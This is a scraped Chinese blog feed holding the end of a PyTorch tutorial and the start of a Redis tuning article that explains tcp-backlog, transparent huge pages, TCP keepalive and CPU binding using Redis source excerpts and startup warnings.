<p><strong>1. 自定义层和损失函数</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 自定义层</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomLayer</span>(nn.Module):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, in_features, out_features</span>):
        <span class="hljs-built_in">super</span>().__init__()
        self.linear = nn.Linear(in_features, out_features)
        self.custom_param = nn.Parameter(torch.randn(out_features))
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):
        <span class="hljs-keyword">return</span> self.linear(x) + self.custom_param

<span class="hljs-comment"># 自定义损失函数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_loss</span>(<span class="hljs-params">output, target</span>):
    <span class="hljs-keyword">return</span> torch.mean((output - target) ** <span class="hljs-number">2</span>) + torch.<span class="hljs-built_in">abs</span>(output).mean()
</code></pre>
<p><strong>2. 使用预训练模型（迁移学习）</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> models

<span class="hljs-comment"># 加载预训练的 ResNet</span>
model = models.resnet18(pretrained=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 冻结部分层</span>
<span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> model.parameters():
    param.requires_grad = <span class="hljs-literal">False</span>

<span class="hljs-comment"># 替换最后一层</span>
model.fc = nn.Linear(<span class="hljs-number">512</span>, num_classes)
</code></pre>
<p><strong>3. 分布式训练</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch.distributed <span class="hljs-keyword">as</span> dist

<span class="hljs-comment"># 初始化分布式环境</span>
dist.init_process_group(backend=<span class="hljs-string">'nccl'</span>)

<span class="hljs-comment"># 包装模型</span>
model = nn.parallel.DistributedDataParallel(model)
</code></pre>
<h3 data-id="heading-19">生态系统扩展</h3>
<p>PyTorch 拥有庞大的生态系统，以下是一些重要的扩展库：</p>
<ul>
<li><strong>torchvision</strong>：计算机视觉工具包，包含数据集、模型和图像变换</li>
<li><strong>torchaudio</strong>：音频处理工具包</li>
<li><strong>torchtext</strong>：自然语言处理工具包</li>
<li><strong>PyTorch Lightning</strong>：轻量级训练框架，简化训练循环</li>
<li><strong>Hugging Face Transformers</strong>：最流行的 NLP 预训练模型库</li>
<li><strong>Captum</strong>：模型可解释性工具</li>
</ul>
<h3 data-id="heading-20">学习资源推荐</h3>
<p><strong>官方资源：</strong></p>
<ul>
<li>PyTorch 官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpytorch.org%2Fdocs%2F" target="_blank" title="https://pytorch.org/docs/" ref="nofollow noopener noreferrer">pytorch.org/docs/</a></li>
<li>PyTorch 教程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpytorch.org%2Ftutorials%2F" target="_blank" title="https://pytorch.org/tutorials/" ref="nofollow noopener noreferrer">pytorch.org/tutorials/</a></li>
<li>PyTorch 论文：阅读 PyTorch 团队发表的论文了解设计理念</li>
</ul>
<p><strong>社区资源：</strong></p>
<ul>
<li>PyTorch 论坛：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscuss.pytorch.org%2F" target="_blank" title="https://discuss.pytorch.org/" ref="nofollow noopener noreferrer">discuss.pytorch.org/</a></li>
<li>GitHub 上丰富的开源项目</li>
<li>优秀的博客和视频教程（如莫烦Python、吴恩达深度学习课程）</li>
</ul>
<p><strong>实践项目：</strong></p>
<ul>
<li>复现经典论文：尝试用 PyTorch 实现 ResNet、Transformer 等经典模型</li>
<li>参加 Kaggle 比赛：在真实问题上磨练技能</li>
<li>贡献开源项目：为 PyTorch 生态系统做出贡献</li>
</ul>
<p>PyTorch 的学习曲线虽然平缓，但要精通仍需要大量的实践和探索。建议从简单的项目开始，逐步挑战更复杂的任务，多阅读优秀代码，关注社区动态。深度学习是一个快速发展的领域，保持好奇心和持续学习的心态至关重要。</p>
<p>祝你在 PyTorch 的学习之旅中收获满满！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis 调优：必须关注的几个参数]]></title>    <link>https://juejin.cn/post/7602935146706632750</link>    <guid>https://juejin.cn/post/7602935146706632750</guid>    <pubDate>2026-02-05T06:49:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602935146706632750" data-draft-id="7602928386596601882" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis 调优：必须关注的几个参数"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T06:49:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神奇小汤圆"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis 调优：必须关注的几个参数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神奇小汤圆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:49:57.000Z" title="Thu Feb 05 2026 06:49:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>在一台未经过任何调优的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269234620%26content_type%3DArticle%26match_order%3D1%26q%3DLinux%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269234620&amp;content_type=Article&amp;match_order=1&amp;q=Linux&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Linux</a> 服务器上部署 Redis，在 Redis 启动过程中，可能会碰到以下警告信息。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-number">1363410</span><span class="hljs-string">:M</span> <span class="hljs-number">15</span> <span class="hljs-string">Jan</span> <span class="hljs-number">2026 13:07:34.879</span> <span class="hljs-comment"># WARNING: The TCP backlog setting of 512 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.</span>
<span class="hljs-number">1363410</span><span class="hljs-string">:M</span> <span class="hljs-number">15</span> <span class="hljs-string">Jan</span> <span class="hljs-number">2026 13:07:34.879</span> <span class="hljs-comment"># Server initialized</span>
<span class="hljs-number">1363410</span><span class="hljs-string">:M</span> <span class="hljs-number">15</span> <span class="hljs-string">Jan</span> <span class="hljs-number">2026 13:07:34.879</span> <span class="hljs-comment"># WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.</span>
<span class="hljs-number">1363410</span><span class="hljs-string">:M</span> <span class="hljs-number">15</span> <span class="hljs-string">Jan</span> <span class="hljs-number">2026 13:07:34.879</span> <span class="hljs-comment"># WARNING You have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo madvise &gt; /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled (set to 'madvise' or 'never').</span>
</code></pre>
<p>这些警告信息实际上是在提醒我们，操作系统的某些参数设置得不合理，需要调整，否则会影响 Redis 的性能和稳定性。</p>
<p>除此之外，Redis 还提供了多个参数，用于在进程或连接级别进行内核参数优化，例如：</p>
<ul>
<li><strong>tcp-backlog</strong>：设置 TCP 服务器中<code>listen()</code>的 backlog 参数。</li>
<li><strong>disable-thp</strong>：在进程级别关闭透明大页（THP）。</li>
<li><strong>tcp-keepalive</strong>：在连接级别设置 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269234620%26content_type%3DArticle%26match_order%3D1%26q%3DTCP%2BKeepalive%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269234620&amp;content_type=Article&amp;match_order=1&amp;q=TCP+Keepalive&amp;zhida_source=entity" ref="nofollow noopener noreferrer">TCP Keepalive</a> 参数。</li>
<li><strong>server_cpulist、bio_cpulist</strong>：可将 Redis 进程或后台 I/O 线程绑定到指定 CPU。</li>
<li><strong>oom-score-adj</strong>、<strong>oom-score-adj-values</strong>：调整进程的 oom_score。oom_score 是 Linux 内核为每个进程计算的一个整数值（位于<code>/proc/[pid]/oom_score</code>），分数越高，进程在内存不足时越容易被 OOM Killer 杀死。</li>
</ul>
<p>下面，我们看看这些参数的实现细节和设置建议。</p>
<h2 data-id="heading-1">tcp-backlog</h2>
<pre><code class="hljs language-sql" lang="sql">createIntConfig("tcp-backlog", <span class="hljs-keyword">NULL</span>, IMMUTABLE_CONFIG, <span class="hljs-number">0</span>, INT_MAX, server.tcp_backlog, <span class="hljs-number">511</span>, INTEGER_CONFIG, <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">NULL</span>), <span class="hljs-comment">/* TCP listen backlog. */</span>
</code></pre>
<p>tcp-backlog 用于设置 TCP 服务器在调用<code>listen()</code>时使用的 backlog 参数。该参数用于指定已完成三次握手、但尚未被<code>accept()</code>处理的连接队列长度。</p>
<p>下面是一个典型的 TCP 服务器流程：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 1. 创建 socket</span>
int fd = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>); 
<span class="hljs-comment">// 2. 绑定 IP + 端口</span>
<span class="hljs-built_in">bind</span>(fd, ...);   
<span class="hljs-comment">// 3. 开始监听</span>
<span class="hljs-built_in">listen</span>(fd, backlog);       
<span class="hljs-comment">// 4. 接受连接</span>
int connfd = <span class="hljs-built_in">accept</span>(fd, ...);
</code></pre>
<p>当客户端发起连接时：</p>
<ol>
<li>TCP 三次握手完成后，连接会被放入已完成连接队列（accept queue），其长度由<code>listen(backlog)</code>控制。</li>
<li>服务器通过<code>accept()</code>从队列中取走连接，交给应用层处理。</li>
<li>当已完成连接队列已满时，新完成三次握手的连接无法进入 accept queue，内核通常会丢弃或延迟 ACK，导致客户端出现连接超时、重传。</li>
</ol>
<p>tcp-backlog 的默认值为 511，对应的内存变量为 server.tcp_backlog。</p>
<pre><code class="hljs language-perl" lang="perl">static <span class="hljs-keyword">int</span> anetListen(char *err, <span class="hljs-keyword">int</span> s, struct sockaddr *sa, socklen_t len, <span class="hljs-keyword">int</span> backlog) {
    <span class="hljs-regexp">//</span> 将 <span class="hljs-keyword">socket</span> 绑定到指定的 IP 和端口
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">bind</span>(s,sa,len) == -<span class="hljs-number">1</span>) {
        anetSetError(err, <span class="hljs-string">"bind: %s"</span>, strerror(errno));
        <span class="hljs-keyword">close</span>(s);
        <span class="hljs-keyword">return</span> ANET_ERR;
    }
    // 将 <span class="hljs-keyword">socket</span> 设置为监听状态，开始接收客户端连接，backlog 指定内核允许排队的最大未处理连接数
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">listen</span>(s, backlog) == -<span class="hljs-number">1</span>) {
        anetSetError(err, <span class="hljs-string">"listen: %s"</span>, strerror(errno));
        <span class="hljs-keyword">close</span>(s);
        <span class="hljs-keyword">return</span> ANET_ERR;
    }
    <span class="hljs-keyword">return</span> ANET_OK;
}
</code></pre>
<p>实例在启动时，会调用<code>checkTcpBacklogSettings()</code>检查 server.tcp_backlog 的配置是否合理。</p>
<pre><code class="hljs language-scss" lang="scss">void <span class="hljs-built_in">checkTcpBacklogSettings</span>(void) {
<span class="hljs-selector-id">#if</span> <span class="hljs-built_in">defined</span>(HAVE_PROC_SOMAXCONN)
    FILE *fp = <span class="hljs-built_in">fopen</span>("/proc/sys/net/core/somaxconn","r");
    char buf<span class="hljs-selector-attr">[1024]</span>;
    if (!fp) return;
    if (fgets(buf,sizeof(buf),fp) != NULL) {
        int somaxconn = <span class="hljs-built_in">atoi</span>(buf);
        if (somaxconn &gt; <span class="hljs-number">0</span> &amp;&amp; somaxconn &lt; server.tcp_backlog) {
            <span class="hljs-built_in">serverLog</span>(LL_WARNING,"WARNING: The TCP backlog setting of %d cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of %d.", server.tcp_backlog, somaxconn);
        }
    }
    <span class="hljs-built_in">fclose</span>(fp);
...
<span class="hljs-selector-id">#endif</span>
}
</code></pre>
<p>具体实现上，它会获取<code>/proc/sys/net/core/somaxconn</code>的值。</p>
<p>somaxconn 决定了 Linux 内核允许的单个 TCP socket 的最大 backlog 队列长度，也就是<code>listen()</code>的 backlog 参数在内核层面的上限。</p>
<p>如果 somaxconn 的值小于 tcp-backlog，Redis 会打印如下信息，此时，在<code>listen()</code>函数中实际生效的就是 somaxconn 的值。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># WARNING: The TCP backlog setting of 512 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.</span>
</code></pre>
<p>设置建议：对于普通的 Web 服务（几百并发），默认值（511）已经足够。如果是高并发服务（上万并发 TCP 连接），可将 backlog 调整为 4096 甚至更高。</p>
<h2 data-id="heading-2">disable-thp</h2>
<pre><code class="hljs language-vbscript" lang="vbscript">createBoolConfig(<span class="hljs-string">"disable-thp"</span>, <span class="hljs-literal">NULL</span>, IMMUTABLE_CONFIG, <span class="hljs-built_in">server</span>.disable_thp, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>),
</code></pre>
<p>disable-thp 用来控制是否在进程级别关闭透明大页。默认值是 1，对应的内部变量是 server.disable_thp。</p>
<p>实例在启动时，会调用<code>linuxMemoryWarnings</code>判断 Linux 系统内存相关的配置。</p>
<pre><code class="hljs language-ini" lang="ini">void linuxMemoryWarnings(void) {
    sds <span class="hljs-attr">err_msg</span> = NULL<span class="hljs-comment">;</span>
    if (checkOvercommit(&amp;err_msg) &lt; 0) {
        serverLog(LL_WARNING,"WARNING %s", err_msg)<span class="hljs-comment">;</span>
        sdsfree(err_msg)<span class="hljs-comment">;</span>
    }
    if (checkTHPEnabled(&amp;err_msg) &lt; 0) {
        <span class="hljs-attr">server.thp_enabled</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        if (THPDisable() == 0) {
            <span class="hljs-attr">server.thp_enabled</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        } else {
            serverLog(LL_WARNING, "WARNING %s", err_msg)<span class="hljs-comment">;</span>
        }
        sdsfree(err_msg)<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>在具体实现上，该函数首先会调用<code>checkOvercommit</code>获取<code>/proc/sys/vm/overcommit_memory</code>的值，如果 overcommit_memory 值不为 1，则会提示以下警告信息。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.</span>
</code></pre>
<p>在 Redis 中，建议将 vm.overcommit_memory 设置为 1，否则<code>fork()</code>子进程（如 RDB、AOF rewrite、全量复制）操作在低内存时会失败。</p>
<p>接着，会调用<code>checkTHPEnabled</code>获取<code>/sys/kernel/mm/transparent_hugepage/enabled</code>的值，如果它的值为 always，则会调用<code>THPDisable()</code>。</p>
<p>该函数会基于 server.disable_thp 的值来决定是否禁用当前进程的透明大页。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span>
<span class="hljs-comment">/* since linux-3.5, kernel supports to set the state of the "THP disable" flag
 * for the calling thread. PR_SET_THP_DISABLE is defined in linux/prctl.h */</span>
<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">THPDisable</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{
    <span class="hljs-type">int</span> ret = -EINVAL;

    <span class="hljs-keyword">if</span> (!server.disable_thp)
        <span class="hljs-keyword">return</span> ret;

<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PR_SET_THP_DISABLE</span>
    ret = <span class="hljs-built_in">prctl</span>(PR_SET_THP_DISABLE, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>

    <span class="hljs-keyword">return</span> ret;
}
</code></pre>
<p>如果该变量的值为 0，则不关闭，如果为 1，则会调用<code>prctl(PR_SET_THP_DISABLE, 1, 0, 0, 0)</code>禁用当前进程的透明大页。</p>
<p>如果操作系统开启了透明大页，且 Redis 没有关闭，则会在日志中打印以下信息。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># WARNING You have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo madvise &gt; /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled (set to 'madvise' or 'never').</span>
</code></pre>
<p>在 Redis 中，建议关闭透明大页，否则<code>fork()</code> 操作可能因管理大页而显著变慢，而且内存紧张时，合并/拆分大页操作也会增加 Redis 响应耗时。</p>
<p>设置建议：默认值即可。</p>
<h2 data-id="heading-3">tcp-keepalive</h2>
<pre><code class="hljs language-vbscript" lang="vbscript">createIntConfig(<span class="hljs-string">"tcp-keepalive"</span>, <span class="hljs-literal">NULL</span>, MODIFIABLE_CONFIG, <span class="hljs-number">0</span>, INT_MAX, <span class="hljs-built_in">server</span>.tcpkeepalive, <span class="hljs-number">300</span>, INTEGER_CONFIG, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>),
</code></pre>
<p>tcp-keepalive 的默认值为 300，对应的内部变量是 server.tcpkeepalive。</p>
<p>Redis 会在建立 TCP 连接后调用<code>anetKeepAlive</code>函数，通过 setsockopt 配置底层 socket 的 keepalive 参数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">int anetKeepAlive(char *err, int fd, int interval)
{
    int <span class="hljs-keyword">val</span> = <span class="hljs-number">1</span>;
    <span class="hljs-comment">// 启用 TCP keepalive</span>
    <span class="hljs-keyword">if</span> (setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &amp;<span class="hljs-keyword">val</span>, sizeof(<span class="hljs-keyword">val</span>)) == -<span class="hljs-number">1</span>)
    {
        anetSetError(err, <span class="hljs-string">"setsockopt SO_KEEPALIVE: %s"</span>, strerror(errno));
        <span class="hljs-keyword">return</span> ANET_ERR;
    }
    <span class="hljs-comment">// 设置首次探测时间：空闲 interval 秒后开始发送第一个探测包</span>
    <span class="hljs-keyword">val</span> = interval;
    <span class="hljs-keyword">if</span> (setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE, &amp;<span class="hljs-keyword">val</span>, sizeof(<span class="hljs-keyword">val</span>)) &lt; <span class="hljs-number">0</span>) {
        anetSetError(err, <span class="hljs-string">"setsockopt TCP_KEEPIDLE: %s\n"</span>, strerror(errno));
        <span class="hljs-keyword">return</span> ANET_ERR;
    }
    <span class="hljs-comment">// 设置探测间隔：每 interval/3 秒发送一次探测包</span>
    <span class="hljs-keyword">val</span> = interval/<span class="hljs-number">3</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">val</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">val</span> = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">if</span> (setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &amp;<span class="hljs-keyword">val</span>, sizeof(<span class="hljs-keyword">val</span>)) &lt; <span class="hljs-number">0</span>) {
        anetSetError(err, <span class="hljs-string">"setsockopt TCP_KEEPINTVL: %s\n"</span>, strerror(errno));
        <span class="hljs-keyword">return</span> ANET_ERR;
    }
    <span class="hljs-comment">// 设置最大探测次数：连续 3 次探测失败后判定连接已死</span>
    <span class="hljs-keyword">val</span> = <span class="hljs-number">3</span>;
    <span class="hljs-keyword">if</span> (setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &amp;<span class="hljs-keyword">val</span>, sizeof(<span class="hljs-keyword">val</span>)) &lt; <span class="hljs-number">0</span>) {
        anetSetError(err, <span class="hljs-string">"setsockopt TCP_KEEPCNT: %s\n"</span>, strerror(errno));
        <span class="hljs-keyword">return</span> ANET_ERR;
    }
    ...
    <span class="hljs-keyword">return</span> ANET_OK;
}
</code></pre>
<p>下面是 Redis 中的设置与 Linux 对应参数默认值的对比：</p>





























<table><thead><tr><th>选项</th><th>对应内核参数</th><th>作用</th><th>代码逻辑与默认值对比</th></tr></thead><tbody><tr><td>TCP_KEEPIDLE</td><td>net.ipv4.tcp_keepalive_time</td><td>首次探测的等待时间。连接空闲多久后发送第一个探测包。</td><td>设为 tcp-keepalive。默认是 7200 秒。</td></tr><tr><td>TCP_KEEPINTVL</td><td>net.ipv4.tcp_keepalive_intvl</td><td>探测间隔。两个探测包之间的时间。</td><td>设为 tcp-keepalive/3（最小为1）。默认是 75 秒。</td></tr><tr><td>TCP_KEEPCNT</td><td>net.ipv4.tcp_keepalive_probes</td><td>探测次数。达到次数后仍无响应则判定连接死亡。</td><td>固定设为 3。默认是 9 次。</td></tr></tbody></table>
<p>Redis 通过在连接级别设置较短的 TCP Keepalive 参数，可以提前发现死掉或异常的客户端连接；避免长时间保留无效连接占用资源；提高 Redis 在长连接和高并发场景下的稳定性。</p>
<p>设置建议：默认值即可。如果网络质量特别差，可设置更小的值。</p>
<h2 data-id="heading-4">xxx_cpulist</h2>
<p>Redis 支持通过参数对不同执行单元进行 CPU 绑定，相关参数如下：</p>
<pre><code class="hljs language-vbscript" lang="vbscript">createStringConfig(<span class="hljs-string">"server_cpulist"</span>, <span class="hljs-literal">NULL</span>, IMMUTABLE_CONFIG, EMPTY_STRING_IS_NULL, <span class="hljs-built_in">server</span>.server_cpulist, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>),
createStringConfig(<span class="hljs-string">"bio_cpulist"</span>, <span class="hljs-literal">NULL</span>, IMMUTABLE_CONFIG, EMPTY_STRING_IS_NULL, <span class="hljs-built_in">server</span>.bio_cpulist, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>),
createStringConfig(<span class="hljs-string">"aof_rewrite_cpulist"</span>, <span class="hljs-literal">NULL</span>, IMMUTABLE_CONFIG, EMPTY_STRING_IS_NULL, <span class="hljs-built_in">server</span>.aof_rewrite_cpulist, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>),
createStringConfig(<span class="hljs-string">"bgsave_cpulist"</span>, <span class="hljs-literal">NULL</span>, IMMUTABLE_CONFIG, EMPTY_STRING_IS_NULL, <span class="hljs-built_in">server</span>.bgsave_cpulist, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>),
</code></pre>
<p>其中，server_cpulist、bio_cpulist、bgsave_cpulist、aof_rewrite_cpulist 分别用于绑定 Redis 主线程、BIO 后台线程、RDB 子进程和 AOF rewrite 子进程。</p>
